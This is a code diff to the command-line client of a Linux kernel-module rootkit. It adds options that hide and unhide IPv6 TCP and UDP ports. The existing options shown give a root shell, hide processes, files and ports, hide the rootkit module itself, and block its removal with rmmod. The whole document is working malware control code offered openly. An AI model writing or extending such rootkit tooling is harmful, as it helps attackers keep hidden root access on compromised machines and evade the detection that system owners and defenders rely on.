@@ -48,8 +48,12 @@ void print_help(char **argv)
         "  --unhide-file=FILENAME    Unhides the specified FILENAME.\n"
         "  --hide-tcp-port=PORT      Hides the specified tcp PORT\n"
         "  --unhide-tcp-port=PORT    Unhides the specified tcp PORT\n"
+        "  --hide-tcp6-port=PORT     Hides the specified tcp6 PORT\n"
+        "  --unhide-tcp6-port=PORT   Unhides the specified tcp6 PORT\n"
         "  --hide-udp-port=PORT      Hides the specified udp PORT\n"
         "  --unhide-udp-port=PORT    Unhides the specified udp PORT\n"
+        "  --hide-udp6-port=PORT     Hides the specified udp6 PORT\n"
+        "  --unhide-udp6-port=PORT   Unhides the specified udp6 PORT\n"
         "  --hide                    Hides the rootkit LKM.\n"
         "  --unhide                  Unhides the rootkit LKM.\n"
         "  --help                    Print this help message.\n"
@@ -57,12 +61,11 @@ void print_help(char **argv)
         "  --unprotect               Disables the rmmod protection.\n\n", argv[0]);
 }
 
-void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_pid,
-                                   int *unhide_pid, char **pid, int *hide_file,
-                                   int *unhide_file, char **file, int *hide_tcp_port,
-                                   int *unhide_tcp_port, int *hide_udp_port,
-                                   int *unhide_udp_port, char **port,  int *hide,
-                                   int *unhide, int *protect, int *unprotect)
+void handle_command_line_arguments(int argc, char **argv, int *root, 
+                                   int *hide_pid, int *unhide_pid, char **pid, int *hide_file, int *unhide_file, char **file, 
+                                   int *hide_tcp_port, int *unhide_tcp_port, int *hide_tcp6_port, int *unhide_tcp6_port,
+                                   int *hide_udp_port, int *unhide_udp_port, int *hide_udp6_port, int *unhide_udp6_port, 
+                                   char **port, int *hide, int *unhide, int *protect, int *unprotect)
 {
     if (argc < 2) {
         fprintf(stderr, "Error: No arguments provided.\n\n");
@@ -73,21 +76,25 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
     opterr = 0;
 
     static struct option long_options[] = {
-        {"root-shell",      no_argument,       0, 'a'},
-        {"hide-pid",        required_argument, 0, 'b'},
-        {"unhide-pid",      required_argument, 0, 'c'},
-        {"hide-file",       required_argument, 0, 'd'},
-        {"unhide-file",     required_argument, 0, 'e'},
-        {"hide-tcp-port",   required_argument, 0, 'f'},
-        {"unhide-tcp-port", required_argument, 0, 'g'},
-        {"hide-udp-port",   required_argument, 0, 'h'},
-        {"unhide-udp-port", required_argument, 0, 'i'},
-        {"hide",            no_argument,       0, 'j'},
-        {"unhide",          no_argument,       0, 'k'},
-        {"help",            no_argument,       0, 'm'},
-        {"protect",         no_argument,       0, 'n'},
-        {"unprotect",       no_argument,       0, 'o'},
-        {0,                 0,                 0,  0 }
+        {"root-shell",       no_argument,       0, 'a'},
+        {"hide-pid",         required_argument, 0, 'b'},
+        {"unhide-pid",       required_argument, 0, 'c'},
+        {"hide-file",        required_argument, 0, 'd'},
+        {"unhide-file",      required_argument, 0, 'e'},
+        {"hide-tcp-port",    required_argument, 0, 'f'},
+        {"unhide-tcp-port",  required_argument, 0, 'g'},
+        {"hide-tcp6-port",   required_argument, 0, 'h'},
+        {"unhide-tcp6-port", required_argument, 0, 'i'},
+        {"hide-udp-port",    required_argument, 0, 'j'},
+        {"unhide-udp-port",  required_argument, 0, 'k'},
+        {"hide-udp6-port",   required_argument, 0, 'l'},
+        {"unhide-udp6-port", required_argument, 0, 'm'},
+        {"hide",             no_argument,       0, 'n'},
+        {"unhide",           no_argument,       0, 'o'},
+        {"help",             no_argument,       0, 'p'},
+        {"protect",          no_argument,       0, 'q'},
+        {"unprotect",        no_argument,       0, 'r'},
+        {0,                  0,                 0,  0 }
     };
 
     *root = 0;
@@ -99,8 +106,12 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
     *file = NULL;
     *hide_tcp_port = 0;
     *unhide_tcp_port = 0;
+    *hide_tcp6_port = 0;
+    *unhide_tcp6_port = 0;
     *hide_udp_port = 0;
     *unhide_udp_port = 0;
+    *hide_udp6_port = 0;
+    *unhide_udp6_port = 0;
     *port = NULL;
     *hide = 0;
     *unhide = 0;
@@ -145,35 +156,55 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
             case 'g':
                 *unhide_tcp_port = 1;
                 *port = optarg;
-                break;              
-            
+                break;
+               
             case 'h':
+                *hide_tcp6_port = 1;
+                *port = optarg;
+                break;
+              
+            case 'i':
+                *unhide_tcp6_port = 1;
+                *port = optarg;
+                break;
+            
+            case 'j':
                 *hide_udp_port = 1;
                 *port = optarg;
                 break;
                 
-            case 'i':
+            case 'k':
                 *unhide_udp_port = 1;
                 *port = optarg;
                 break;
+                
+            case 'l':
+                *hide_udp6_port = 1;
+                *port = optarg;
+                break;
+                
+            case 'm':
+                *unhide_udp6_port = 1;
+                *port = optarg;
+                break;                 
 
-            case 'j':
+            case 'n':
                 *hide = 1;
                 break;
 
-            case 'k':
+            case 'o':
                 *unhide = 1;
                 break;
 
-            case 'm':
+            case 'p':
                 print_help(argv);
                 exit(0);
 
-            case 'n':
+            case 'q':
                 *protect = 1;
                 break;
 
-            case 'o':
+            case 'r':
                 *unprotect = 1;
                 break;
                       
@@ -192,7 +223,8 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
     }
 
     if ((*root + *hide_pid + *unhide_pid + *hide_file + *unhide_file + 
-         + *hide_tcp_port + *unhide_tcp_port + *hide_udp_port + *unhide_udp_port +
+         *hide_tcp_port + *unhide_tcp_port + *hide_tcp6_port + *unhide_tcp6_port + 
+         *hide_udp_port + *unhide_udp_port + *hide_udp6_port + *unhide_udp6_port +
          *hide + *unhide + *protect + *unprotect) != 1) {
         fprintf(stderr, "Error: Exactly one option should be specified\n\n");
         print_help(argv);
@@ -217,8 +249,12 @@ int main(int argc, char **argv)
     char *file;
     int hide_tcp_port;
     int unhide_tcp_port;
+    int hide_tcp6_port;
+    int unhide_tcp6_port;
     int hide_udp_port;
     int unhide_udp_port;
+    int hide_udp6_port;
+    int unhide_udp6_port;
     char *port;
     int hide;
     int unhide;
@@ -226,10 +262,11 @@ int main(int argc, char **argv)
     int unprotect;
     
 
-    handle_command_line_arguments(argc, argv, &root, &hide_pid, &unhide_pid, &pid,
-                                  &hide_file, &unhide_file, &file,
-                                  &hide_tcp_port, &unhide_tcp_port, &hide_udp_port, &unhide_udp_port, &port,
-                                  &hide, &unhide, &protect, &unprotect);
+    handle_command_line_arguments(argc, argv, &root, 
+                                  &hide_pid, &unhide_pid, &pid, &hide_file, &unhide_file, &file,
+                                  &hide_tcp_port, &unhide_tcp_port, &hide_tcp6_port, &unhide_tcp6_port,
+                                  &hide_udp_port, &unhide_udp_port, &hide_udp6_port, &unhide_udp6_port, 
+                                  &port, &hide, &unhide, &protect, &unprotect);
 
     size_t buf_size = 0;
 
@@ -249,10 +286,18 @@ int main(int argc, char **argv)
         buf_size += sizeof(CFG_HIDE_TCP_PORT) + strlen(port);
     } else if (unhide_tcp_port) {
         buf_size += sizeof(CFG_UNHIDE_TCP_PORT) + strlen(port);
+    } else if (hide_tcp6_port) {
+        buf_size += sizeof(CFG_HIDE_TCP6_PORT) + strlen(port);
+    } else if (unhide_tcp6_port) {
+        buf_size += sizeof(CFG_UNHIDE_TCP6_PORT) + strlen(port);
     } else if (hide_udp_port) {
         buf_size += sizeof(CFG_HIDE_UDP_PORT) + strlen(port);
     } else if (unhide_udp_port) {
         buf_size += sizeof(CFG_UNHIDE_UDP_PORT) + strlen(port);
+    } else if (hide_udp6_port) {
+        buf_size += sizeof(CFG_HIDE_UDP6_PORT) + strlen(port);
+    } else if (unhide_udp6_port) {
+        buf_size += sizeof(CFG_UNHIDE_UDP6_PORT) + strlen(port);
     } else if (hide) {
         buf_size += sizeof(CFG_HIDE);
     } else if (unhide) {
@@ -292,11 +337,23 @@ int main(int argc, char **argv)
     } else if (unhide_tcp_port) {
         write_buffer(&buf_ptr, CFG_UNHIDE_TCP_PORT, sizeof(CFG_UNHIDE_TCP_PORT));
         write_buffer(&buf_ptr, port, strlen(port));
+    } else if (hide_tcp6_port) {
+        write_buffer(&buf_ptr, CFG_HIDE_TCP6_PORT, sizeof(CFG_HIDE_TCP6_PORT));
+        write_buffer(&buf_ptr, port, strlen(port));
+    } else if (unhide_tcp6_port) {
+        write_buffer(&buf_ptr, CFG_UNHIDE_TCP6_PORT, sizeof(CFG_UNHIDE_TCP6_PORT));
+        write_buffer(&buf_ptr, port, strlen(port));
     } else if (hide_udp_port) {
         write_buffer(&buf_ptr, CFG_HIDE_UDP_PORT, sizeof(CFG_HIDE_UDP_PORT));
         write_buffer(&buf_ptr, port, strlen(port));
     } else if (unhide_udp_port) {
         write_buffer(&buf_ptr, CFG_UNHIDE_UDP_PORT, sizeof(CFG_UNHIDE_UDP_PORT));
+        write_buffer(&buf_ptr, port, strlen(port));
+    } else if (hide_udp6_port) {
+        write_buffer(&buf_ptr, CFG_HIDE_UDP6_PORT, sizeof(CFG_HIDE_UDP6_PORT));
+        write_buffer(&buf_ptr, port, strlen(port));
+    } else if (unhide_udp6_port) {
+        write_buffer(&buf_ptr, CFG_UNHIDE_UDP6_PORT, sizeof(CFG_UNHIDE_UDP6_PORT));
         write_buffer(&buf_ptr, port, strlen(port));
     } else if (hide) {
         write_buffer(&buf_ptr, CFG_HIDE, sizeof(CFG_HIDE));
